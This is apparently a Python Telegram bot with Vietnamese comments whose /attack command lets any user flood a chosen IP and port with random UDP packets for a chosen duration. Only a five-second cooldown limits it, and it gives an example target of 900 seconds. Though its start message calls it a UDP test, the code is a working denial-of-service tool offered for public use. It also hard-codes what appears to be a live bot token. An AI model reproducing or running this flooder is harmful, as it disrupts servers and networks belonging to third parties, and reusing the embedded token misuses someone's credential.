import telebot
import threading
import time
import socket
import random

# === Cấu hình ===
TOKEN = "8137622733:AAHJEiP0Wx3Lis7jVUwuBJgfIT29-3MqEqI"
bot = telebot.TeleBot(TOKEN)

cooldowns = {}  # Lưu thời gian cooldown của từng user

# === UDP Attack ===
def udp_attack(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)

    while time.time() < timeout:
        try:
            sock.sendto(bytes_data, (ip, port))
        except:
            pass

# === /start ===
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Chào bạn! Gửi /attack để thực hiện test UDP.")

# === /myid ===
@bot.message_handler(commands=['myid'])
def myid(message):
    bot.reply_to(message, f"ID của bạn là: `{message.from_user.id}`\nGroup ID: `{message.chat.id}`", parse_mode='Markdown')

# === /attack (ai cũng dùng được, nhưng giới hạn 5s mỗi lần) ===
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    now = time.time()
    last_used = cooldowns.get(user_id, 0)

    if now - last_used < 5:
        wait_time = round(5 - (now - last_used), 1)
        bot.reply_to(message, f"Vui lòng chờ {wait_time} giây nữa rồi thử lại.")
        return

    cooldowns[user_id] = now
    bot.reply_to(message, "Nhập theo cú pháp: `ip port thời_gian`\nVí dụ: `148.153.219.121 10012 900`", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack)

# === Xử lý lệnh attack ===
def process_attack(message):
    try:
        ip, port, duration = message.text.strip().split()
        port = int(port)
        duration = int(duration)
        bot.reply_to(message, f"Đang gửi UDP tới {ip}:{port} trong {duration} giây.")
        thread = threading.Thread(target=udp_attack, args=(ip, port, duration))
        thread.start()
    except:
        bot.reply_to(message, "Sai cú pháp. Nhập lại theo dạng: `ip port thời_gian`", parse_mode='Markdown')

# === Khởi động bot ===
if __name__ == '__main__':
    print("Bot đang chạy...")
    bot.infinity_polling()
